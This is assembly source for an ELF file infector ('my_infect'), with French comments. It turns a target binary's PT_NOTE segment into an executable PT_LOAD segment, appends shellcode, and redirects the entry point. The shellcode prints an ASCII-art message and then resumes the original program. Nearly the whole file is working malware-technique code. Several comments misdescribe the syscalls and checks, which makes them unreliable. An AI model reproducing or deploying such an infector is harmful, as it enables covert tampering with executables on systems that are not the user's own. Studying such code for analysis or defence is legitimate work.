section .data
    ; Définition de messages d'erreur ou d'informations pour l'affichage
msg_not_elf_new db "Ce fichier n'est pas un ELF compatible.",0xA
len_not_elf_new equ $ - msg_not_elf_new  ; Calcul de la longueur du message

msg_dir_new db "C'est un dossier, operation impossible.",0xA
len_dir_new equ $ - msg_dir_new

msg_usage_new db "Usage: ./my_infect <filename>",0xA
len_usage_new equ $ - msg_usage_new

msg_open_err_new db "Impossible d'ouvrir ce fichier.",0xA
len_open_err_new equ $ - msg_open_err_new

msg_ok_new db ' /$$$$$$                                     /$$     /$$                    ', 10
               db '|_  $$_/                                    | $$    |__/                    ', 10
               db '  | $$   /$$$$$$$  /$$  /$$$$$$   /$$$$$$$ /$$$$$$   /$$  /$$$$$$  /$$$$$$$ ', 10
               db '  | $$  | $$__  $$|__/ /$$__  $$ /$$_____/|_  $$_/  | $$ /$$__  $$| $$__  $$', 10
               db '  | $$  | $$  \ $$ /$$| $$$$$$$$| $$        | $$    | $$| $$  \ $$| $$  \ $$', 10
               db '  | $$  | $$  | $$| $$| $$_____/| $$        | $$ /$$| $$| $$  | $$| $$  | $$', 10
               db ' /$$$$$$| $$  | $$| $$|  $$$$$$$|  $$$$$$$  |  $$$$/| $$|  $$$$$$/| $$  | $$', 10
               db '|______/|__/  |__/| $$ \_______/ \_______/   \___/  |__/ \______/ |__/  |__/', 10
               db '             /$$  | $$                                                      ', 10
               db '            |  $$$$$$/                                                      ', 10
               db '             \______/                                                       ', 10 ,0xA
len_ok_new equ $ - msg_ok_new

section .bss
    ; Réservation de mémoire pour diverses variables
magic_area resb 4            ; Réserve 4 octets pour stocker les informations de magie ELF
info_stat resb 144          ; Réserve 144 octets pour les informations de statut de fichier
elf_buf resb 64             ; Réserve 64 octets pour stocker une partie du fichier ELF
ph_buf resb 56              ; Réserve 56 octets pour les en-têtes de programme ELF

ph_off     resq 1           ; Réserve un mot de 64 bits pour l'offset du programme ELF
ph_esize   resw 1           ; Réserve un mot de 32 bits pour la taille de l'en-tête du programme
ph_count   resw 1           ; Réserve un mot de 32 bits pour le nombre de programmes ELF

cur_ofs   resq 1            ; Réserve un mot de 64 bits pour l'offset courant
fd_sav    resq 1            ; Réserve un mot de 64 bits pour sauvegarder le descripteur de fichier
nt_ofs    resq 1            ; Réserve un mot de 64 bits pour l'offset du tableau des sections ELF
nt_found  resb 1            ; Réserve 1 octet pour indiquer si une section a été trouvée
o_entry   resq 1            ; Réserve un mot de 64 bits pour l'adresse d'entrée du fichier ELF
vmax_end  resq 1            ; Réserve un mot de 64 bits pour l'adresse de fin du fichier ELF

section .data.shellcode
    ; Définition du shellcode qui sera injecté dans le fichier ELF
shellcode:
    ; Sauvegarde des registres pour garantir la propreté de l'état
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi

    ; Envoi du message d'infection (modification discrète du fichier ELF)
    lea rbx, [rel infection_msg]  ; Chargement de l'adresse du message dans rbx
    sub rbx, infmsg_off           ; Ajustement de l'adresse du message
    mov rax,1                     ; Code de la syscall pour l'écriture
    mov rdi,1                     ; Descripteur de fichier (stdout)
    lea rsi,[rbx + infmsg_off]    ; Charge l'adresse du message
    mov rdx,infmsg_len            ; Longueur du message
    syscall                       ; Appel système (écrire le message)

    ; Calcul de la nouvelle adresse d'entrée et modification de l'ELF
    mov r15,[rbx + oent_off]      ; Chargement de l'offset de l'entrée du programme
    mov rcx,[rbx + pvaddr_off]    ; Chargement de l'adresse virtuelle du programme
    sub rbx,rcx                   ; Ajustement de l'adresse pour correspondre à l'offset
    add r15,rbx                   ; Calcul de la nouvelle adresse d'entrée

    ; Restauration des registres et saut à l'adresse d'entrée modifiée
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    jmp r15                       ; Saut à la nouvelle adresse d'entrée du programme

infection_msg db '⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀', 0x0A
    db '⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀', 0x0A
    db '⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀', 0x0A
    db '⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀', 0x0A
    db '⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀', 0x0A
    db '⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀', 0x0A
    db '⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀', 0x0A
    db '⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀', 0x0A
    db '⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆', 0x0A
    db '⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿', 0x0A
    db '⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟', 0x0A
    db '⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃', 0x0A
    db '⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀', 0x0A
    db '⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀', 0x0A
    db '⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀', 0x0A,0xA
infmsg_len equ $ - infection_msg   ; Calcul de la longueur du message

orig_str dq 0                      ; Réserve un double mot pour l'adresse d'origine
pvaddr_str dq 0                    ; Réserve un double mot pour l'adresse virtuelle
shell_end:
infmsg_off equ infection_msg - shellcode  ; Calcul de l'offset du message d'infection
oent_off equ orig_str - shellcode        ; Calcul de l'offset de l'adresse d'origine
pvaddr_off equ pvaddr_str - shellcode   ; Calcul de l'offset de l'adresse virtuelle
sc_size equ shell_end - shellcode       ; Taille totale du shellcode

section .text
global _start

_start:
    ; Vérification du nombre d'arguments passés
    pop rax
    cmp rax,2
    jl usage_mix                ; Si moins de 2 arguments, afficher l'usage

    ; Récupération du nom de fichier
    pop rax
    pop rdi

    ; Appel système pour obtenir des informations sur le fichier
    mov rax,4                   ; Syscall pour obtenir des informations de fichier (fstat)
    lea rsi,[info_stat]         ; Adresse du buffer pour les informations
    syscall
    cmp rax,0                   ; Vérifie si l'appel a échoué
    jne err_open                ; Si échec, afficher une erreur

    ; Vérification du type de fichier (si c'est un dossier)
    mov rax,[info_stat+16]      ; Vérification du type (champ st_mode)
    cmp rax,2                   ; Si c'est un dossier (type 2), afficher une erreur
    je dir_mix

    ; Ouverture du fichier en mode lecture
    mov rax,2                   ; Syscall pour ouvrir le fichier
    mov rsi,2                   ; Ouvrir en lecture seule
    syscall
    cmp rax,0                   ; Vérifie si l'ouverture a échoué
    jl err_open                 ; Si échec, afficher une erreur
    mov [fd_sav],rax            ; Sauvegarde le descripteur de fichier

    ; Lecture de la signature ELF (magique)
    mov rax,0                   ; Syscall pour lire le fichier
    mov rdi,[fd_sav]            ; Descripteur de fichier
    mov rsi,magic_area          ; Buffer pour stocker la signature ELF
    mov rdx,4                   ; Taille de la signature
    syscall
    cmp rax,4                   ; Vérifie si la lecture a réussi
    jne not_elf_m               ; Si la lecture échoue, le fichier n'est pas ELF

    ; Vérification de la signature ELF
    mov eax,dword [magic_area]  ; Lecture des 4 premiers octets
    cmp eax,0x464C457F          ; Comparaison avec la signature ELF (0x464C457F)
    jne not_elf_m               ; Si ce n'est pas ELF, afficher une erreur

    ; Lecture de la première partie du fichier ELF (par exemple les en-têtes)
    mov rax,8                   ; Syscall pour lire 8 octets supplémentaires (en-têtes ELF)
    mov rdi,[fd_sav]            ; Descripteur de fichier
    xor rsi,rsi                 ; Initialisation du buffer
    xor rdx,rdx                 ; Taille du buffer
    syscall
    cmp rax,-1                  ; Vérifie si la lecture a échoué
    je err_open                 ; Si échec, afficher une erreur

    ; Lecture de la section ELF suivante
    mov rax,0                   ; Syscall pour lire d'autres données ELF
    mov rdi,[fd_sav]
    lea rsi,[elf_buf]           ; Buffer pour lire les en-têtes ELF
    mov rdx,64                  ; Lire 64 octets
    syscall
    cmp rax,64                  ; Vérifie si la lecture est complète
    jne err_open                ; Si échec, afficher une erreur
    ; Extraction des informations à partir du buffer ELF
    mov rax,qword [elf_buf+0x20]  ; Charge la valeur de l'offset des segments de programme dans rax
    mov [ph_off],rax              ; Sauvegarde l'offset des segments de programme dans ph_off
    movzx eax,word [elf_buf+0x38] ; Charge la valeur du nombre de segments (ph_count) dans eax
    mov [ph_count],ax             ; Sauvegarde le nombre de segments dans ph_count
    movzx eax,word [elf_buf+0x36] ; Charge la taille de chaque en-tête de programme (ph_esize) dans eax
    mov [ph_esize],ax             ; Sauvegarde la taille de l'en-tête de programme dans ph_esize
    mov rax,[elf_buf+24]          ; Charge l'adresse d'entrée du programme ELF dans rax
    mov [o_entry],rax             ; Sauvegarde l'adresse d'entrée dans o_entry

    ; Initialisation des variables pour la lecture des segments
    movzx r12,word [ph_count]     ; Charge le nombre de segments à traiter (ph_count) dans r12
    mov rsi,[ph_off]              ; Charge l'offset des segments dans rsi
    mov [cur_ofs],rsi             ; Sauvegarde l'offset courant (cur_ofs)
    mov rax,0                     ; Initialise rax à 0 pour vmax_end
    mov [vmax_end],rax            ; Sauvegarde 0 dans vmax_end (fin de la mémoire utilisée)

    ; Sauvegarde des registres pour effectuer des manipulations sans risque d'altérer l'état
    push rbx
    push rcx
    push rdx
    nop                           ; Opération "no-op" pour aligner les instructions
    xor rdx,rdx                   ; Efface rdx
    pop rdx                        ; Restaure rdx
    pop rcx                        ; Restaure rcx
    pop rbx                        ; Restaure rbx
    nop                           ; Opération "no-op" pour aligner les instructions

    ; Début de la boucle pour scanner les segments PT_LOAD et chercher PT_NOTE
scan_load_and_note:
    cmp r12,0                      ; Si r12 est égal à 0, tous les segments ont été scannés
    je after_load_scan             ; Si terminé, passer à la section "after_load_scan"

    ; Lecture de l'en-tête du segment
read_ph:
    mov rax,8                      ; Syscall pour obtenir un segment de programme ELF
    mov rdi,[fd_sav]               ; Descripteur de fichier
    mov rsi,[cur_ofs]              ; Offset courant
    xor rdx,rdx                    ; Initialisation de rdx à 0 (pas d'argument supplémentaire)
    syscall                        ; Appel système pour obtenir les données du segment

    mov rax,0                      ; Syscall pour lire le segment dans le buffer
    mov rdi,[fd_sav]               ; Descripteur de fichier
    lea rsi,[ph_buf]               ; Adresse du buffer pour stocker l'en-tête du segment
    movzx rdx, word [ph_esize]     ; Taille de l'en-tête du programme
    syscall                        ; Appel système pour lire l'en-tête du segment ELF

    mov eax,dword [ph_buf]         ; Récupère le type du segment (ph_type)
    cmp eax,1                      ; Compare si le type est PT_LOAD (1)
    jne skip_load_upd              ; Si ce n'est pas PT_LOAD, passer à l'itération suivante
    mov rax,[ph_buf+16]            ; Charge l'adresse du segment dans rax
    mov rbx,[ph_buf+40]            ; Charge la fin du segment dans rbx
    add rax,rbx                    ; Calcule la fin du segment (adresse + taille)
    cmp rax,[vmax_end]             ; Compare cette fin avec vmax_end (fin actuelle de la mémoire)
    jbe skip_load_upd              ; Si la fin du segment est avant vmax_end, passer à l'itération suivante
    mov [vmax_end],rax             ; Met à jour vmax_end avec la nouvelle fin de segment

skip_load_upd:
    ; Mise à jour de l'offset courant pour le prochain segment
    movzx rax,word [ph_esize]     ; Charge la taille de l'en-tête du programme
    mov rsi,[cur_ofs]              ; Charge l'offset courant
    add rsi,rax                    ; Ajoute la taille de l'en-tête à l'offset
    mov [cur_ofs],rsi             ; Sauvegarde le nouvel offset courant
    dec r12                        ; Décrémente le nombre de segments restants
    cmp r12,0                      ; Vérifie si il reste des segments à traiter
    jne read_ph                    ; Si oui, recommence la lecture du prochain segment

after_load_scan:
    ; Tous les segments PT_LOAD ont été scannés
    mov rsi,[ph_off]               ; Charge l'offset des segments dans rsi
    mov [cur_ofs],rsi             ; Sauvegarde cet offset dans cur_ofs
    movzx r12, word [ph_count]     ; Recharge le nombre de segments
    mov byte [nt_found],0          ; Initialisation de nt_found à 0 (pas encore trouvé PT_NOTE)

    ; Recherche du segment PT_NOTE
find_note_mix:
    cmp r12,0                      ; Vérifie si tous les segments ont été scannés
    je no_nt_found_m               ; Si non, passer à la fin sans trouver PT_NOTE

    ; Boucle pour traiter chaque segment
nt_loop_m:
    mov rax,8                      ; Syscall pour lire un segment ELF
    mov rdi,[fd_sav]               ; Descripteur de fichier
    mov rsi,[cur_ofs]              ; Offset du segment courant
    xor rdx,rdx                    ; Initialisation de rdx à 0
    syscall                        ; Appel système pour lire l'en-tête du segment

    mov rax,0                      ; Syscall pour lire l'en-tête du segment dans le buffer
    mov rdi,[fd_sav]               ; Descripteur de fichier
    lea rsi,[ph_buf]               ; Adresse du buffer
    movzx rdx, word [ph_esize]     ; Taille de l'en-tête du programme
    syscall                        ; Appel système pour lire l'en-tête du segment ELF

    mov eax,dword [ph_buf]         ; Récupère le type du segment (ph_type)
    cmp eax,4                      ; Compare si le type est PT_NOTE (4)
    jne next_phb_m                 ; Si ce n'est pas PT_NOTE, passer au prochain segment

    mov rax,[cur_ofs]              ; Charge l'offset du segment PT_NOTE
    mov [nt_ofs],rax               ; Sauvegarde l'offset de PT_NOTE
    mov byte [nt_found],1          ; Indique que PT_NOTE a été trouvé
    jmp have_nt_m                  ; Passer à l'étape suivante si PT_NOTE trouvé

next_phb_m:
    movzx rax,word [ph_esize]     ; Charge la taille de l'en-tête du programme
    mov rsi,[cur_ofs]              ; Charge l'offset courant
    add rsi,rax                    ; Ajoute la taille de l'en-tête au offset
    mov [cur_ofs],rsi             ; Sauvegarde le nouvel offset courant
    dec r12                        ; Décrémente le nombre de segments restant
    jmp find_note_mix             ; Recommence la recherche du segment PT_NOTE

no_nt_found_m:
    ; Aucun segment PT_NOTE trouvé, on ferme et termine
    jmp close_end_mix              ; Fermeture du fichier et fin du programme
have_nt_m:
    ; Vérifie si un segment PT_NOTE a été trouvé
    mov al,[nt_found]             ; Charge la valeur de nt_found (0 si non trouvé, 1 si trouvé)
    cmp al,0                       ; Compare si nt_found est égal à 0
    je close_end_mix               ; Si non trouvé, on ferme et termine

    ; Si un PT_NOTE a été trouvé, on le modifie directement pour le transformer en PT_LOAD
    nop                             ; Opération "no-op" (pas d'opération)

    ; Lecture de l'en-tête du segment NOTE
    mov rax,8                      ; Syscall pour obtenir un segment à l'offset nt_ofs
    mov rdi,[fd_sav]               ; Descripteur de fichier
    mov rsi,[nt_ofs]               ; Offset du segment NOTE
    xor rdx,rdx                    ; Initialisation de rdx à 0
    syscall                        ; Appel système pour lire l'en-tête du segment NOTE

    mov rax,0                      ; Syscall pour lire l'en-tête du segment NOTE dans ph_buf
    mov rdi,[fd_sav]               ; Descripteur de fichier
    lea rsi,[ph_buf]               ; Adresse du buffer pour l'en-tête du segment
    movzx rdx, word [ph_esize]     ; Taille de l'en-tête du programme
    syscall                        ; Appel système pour lire l'en-tête du segment

    ; Modification des attributs du segment NOTE pour en faire un PT_LOAD
    mov rax,8                      ; Syscall pour effectuer une modification de segment (partie 2)
    mov rdi,[fd_sav]               ; Descripteur de fichier
    xor rsi,rsi                    ; Initialisation de rsi à 0
    mov rdx,2                      ; Nombre d'opérations à effectuer
    syscall                        ; Appel système

    mov r15,rax                    ; Sauvegarde la valeur de rax dans r15

    ; Calcul de l'alignement des adresses mémoire pour les segments PT_LOAD
    xor rcx,rcx                    ; Efface rcx
    add r15,0xFFF                  ; Ajoute 0xFFF pour l'alignement
    and r15,0xFFFFFFFFFFFFF000     ; Aligne l'adresse à 4 Ko près (masque de 4 Ko)
    mov r14,r15                    ; Sauvegarde cette adresse dans r14

    sub rsp,56                     ; Ajuste la pile pour le transfert de données
    mov rcx,56                     ; Charge 56 dans rcx (taille à copier)
    mov rsi,ph_buf                 ; Source des données (ph_buf)
    mov rdi,rsp                    ; Destination (sur la pile)
    rep movsb                      ; Copie les données du buffer vers la pile

    ; Modifie les champs dans ph_buf pour le segment PT_LOAD
    mov dword [ph_buf],1           ; Type de segment: PT_LOAD (1)
    mov dword [ph_buf+4],5         ; Flags: 5 (exécution et lecture)
    mov qword [ph_buf+8],r14       ; P adresse du segment (alignée)

    ; Mise à jour des adresses de début et de fin du segment
    mov rax,[vmax_end]             ; Charge vmax_end dans rax
    add rax,0xFFF                  ; Ajoute 0xFFF pour l'alignement
    and rax,0xFFFFFFFFFFFFF000     ; Aligne l'adresse à 4 Ko près
    add rax,0x400000               ; Décale l'adresse de base de 4 Mo
    mov qword [ph_buf+16],rax      ; Sauvegarde l'adresse de début du segment
    mov qword [ph_buf+24],rax      ; Sauvegarde l'adresse de fin du segment

    ; Mise à jour de la taille du segment et de la mémoire associée
    mov rax,sc_size                ; Charge la taille du shellcode
    mov qword [ph_buf+32],rax      ; Sauvegarde la taille du segment dans ph_buf
    mov qword [ph_buf+40],rax      ; Sauvegarde la taille du segment (identique à la taille de base)
    mov qword [ph_buf+48],0x1000   ; Taille de l'alignement (4 Ko)

    ; Mise à jour de l'adresse d'entrée (entry point) et de l'adresse de la mémoire virtuelle
    mov rax,qword [ph_buf+16]      ; Charge l'adresse du segment
    mov [elf_buf+24],rax           ; Sauvegarde l'adresse du segment dans elf_buf

    ; Réécriture du fichier avec les nouveaux segments
    mov rax,8                      ; Syscall pour réécrire le fichier ELF avec la nouvelle structure
    mov rdi,[fd_sav]               ; Descripteur de fichier
    xor rsi,rsi                    ; Réinitialisation de rsi
    xor rdx,rdx                    ; Réinitialisation de rdx
    syscall                        ; Appel système pour réécrire l'ELF

    ; Lecture de la section modifiée et de l'en-tête
    mov rax,1                      ; Syscall pour modifier l'en-tête du fichier ELF
    mov rdi,[fd_sav]               ; Descripteur de fichier
    lea rsi,[elf_buf]              ; Chargement de elf_buf pour modifier l'ELF
    mov rdx,64                     ; Taille du segment à écrire (64 octets)
    syscall                        ; Appel système

    ; Réécriture du segment NOTE à l'offset nt_ofs
    mov rax,8                      ; Syscall pour réécrire le segment NOTE
    mov rdi,[fd_sav]               ; Descripteur de fichier
    mov rsi,[nt_ofs]               ; Offset du segment NOTE
    xor rdx,rdx                    ; Réinitialisation de rdx
    syscall                        ; Appel système pour réécrire

    ; Réécriture du segment de programme modifié (PT_LOAD)
    mov rax,1                      ; Syscall pour réécrire le segment modifié
    mov rdi,[fd_sav]               ; Descripteur de fichier
    lea rsi,[ph_buf]               ; Chargement du buffer contenant le segment
    mov rdx,56                     ; Taille du segment
    syscall                        ; Appel système pour réécrire le segment

    ; Sauvegarde de l'entrée de programme dans le shellcode
    mov rax,[o_entry]              ; Charge l'adresse d'entrée
    mov rdi,shellcode              ; Charge l'adresse du shellcode
    add rdi,oent_off               ; Décale de l'offset vers l'entrée du programme
    mov [rdi],rax                  ; Sauvegarde l'adresse d'entrée dans le shellcode

    ; Sauvegarde de l'adresse de la mémoire virtuelle
    mov rax,[ph_buf+16]            ; Charge l'adresse de mémoire virtuelle
    mov rdi,shellcode              ; Charge l'adresse du shellcode
    add rdi,pvaddr_off             ; Décale de l'offset vers l'adresse virtuelle
    mov [rdi],rax                  ; Sauvegarde l'adresse virtuelle dans le shellcode

    ; Écriture du shellcode dans le fichier ELF
    mov rax,8                      ; Syscall pour écrire le shellcode dans le fichier
    mov rdi,[fd_sav]               ; Descripteur de fichier
    mov rsi,r14                    ; Adresse du segment modifié
    xor rdx,rdx                    ; Réinitialisation de rdx
    syscall                        ; Appel système pour écrire le shellcode

    ; Réécriture du shellcode dans le fichier
    mov rax,1                      ; Syscall pour écrire le shellcode
    mov rdi,[fd_sav]               ; Descripteur de fichier
    mov rsi,shellcode              ; Adresse du shellcode
    mov rdx,sc_size                ; Taille du shellcode
    syscall                        ; Appel système pour écrire le shellcode

    ; Restauration de la pile
    add rsp,56                     ; Restauration de l'espace de la pile utilisé
    nop                             ; Opération "no-op"

    ; Affichage d'un message de succès
    mov rax,1                      ; Syscall pour afficher le message de succès
    mov rdi,1                      ; Descripteur de sortie standard (stdout)
    lea rsi,[msg_ok_new]           ; Adresse du message
    mov rdx,len_ok_new             ; Longueur du message
    syscall                        ; Appel système pour afficher le message

    ; Fermeture du fichier ELF
    jmp close_end_mix              ; Passage à la section de fermeture

not_elf_m:
    ; Si le fichier n'est pas un ELF valide, on affiche un message d'erreur
    mov rax,1                      ; Syscall pour afficher un message d'erreur
    mov rdi,1                      ; Descripteur de sortie standard (stdout)
    lea rsi,[msg_not_elf_new]      ; Adresse du message d'erreur
    mov rdx,len_not_elf_new        ; Longueur du message
    syscall                        ; Appel système pour afficher le message

    ; Fermeture du fichier ELF et sortie
    jmp close_end_mix              ; Passage à la section de fermeture

dir_mix:
    ; Si le fichier est un répertoire, on affiche un message d'erreur
    mov rax,1                      ; Syscall pour afficher un message d'erreur
    mov rdi,1                      ; Descripteur de sortie standard (stdout)
    lea rsi,[msg_dir_new]          ; Adresse du message d'erreur "C'est un dossier"
    mov rdx,len_dir_new            ; Longueur du message
    syscall                        ; Appel système pour afficher le message

    ; Terminaison du programme
    jmp end_exit_mix               ; Passage à la section de sortie

usage_mix:
    ; Si l'utilisateur n'a pas fourni les bons arguments, on affiche le message d'utilisation
    mov rax,1                      ; Syscall pour afficher un message d'erreur
    mov rdi,1                      ; Descripteur de sortie standard (stdout)
    lea rsi,[msg_usage_new]        ; Adresse du message d'utilisation
    mov rdx,len_usage_new          ; Longueur du message
    syscall                        ; Appel système pour afficher le message

    ; Terminaison du programme
    jmp end_exit_mix               ; Passage à la section de sortie

err_open:
    ; Si une erreur d'ouverture de fichier se produit, on affiche un message d'erreur
    mov rax,1                      ; Syscall pour afficher un message d'erreur
    mov rdi,1                      ; Descripteur de sortie standard (stdout)
    lea rsi,[msg_open_err_new]     ; Adresse du message d'erreur "Impossible d'ouvrir ce fichier"
    mov rdx,len_open_err_new       ; Longueur du message
    syscall                        ; Appel système pour afficher le message

    ; Terminaison du programme
    jmp end_exit_mix               ; Passage à la section de sortie

close_end_mix:
    ; Ferme le fichier ouvert précédemment
    mov rax,3                      ; Syscall pour fermer un fichier
    mov rdi,[fd_sav]               ; Descripteur de fichier à fermer
    syscall                        ; Appel système pour fermer le fichier

    ; Terminaison du programme
    jmp end_exit_mix               ; Passage à la section de sortie

end_exit_mix:
    ; Fin du programme, on termine avec le code de sortie 0 (normal)
    mov rax,60                     ; Syscall pour terminer le programme (exit)
    xor rdi,rdi                    ; Code de sortie 0 (normal)
    syscall                        ; Appel système pour quitter le programme


